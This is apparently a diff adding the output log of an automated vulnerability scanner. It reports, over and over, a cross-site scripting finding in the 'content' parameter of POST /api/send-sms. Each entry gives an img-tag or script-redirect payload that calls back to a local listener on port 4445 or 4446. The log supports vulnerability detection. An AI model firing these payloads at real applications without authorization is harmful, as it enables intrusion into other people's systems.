@@ -1,0 +1,156 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/send-smsLLMcontent'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
+API Vul Type: xss
+Vul API Url: /api/send-sms
+Vul API Method: Post
+API Vul Param: content
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/send-smsLLMcontent'</script>
+
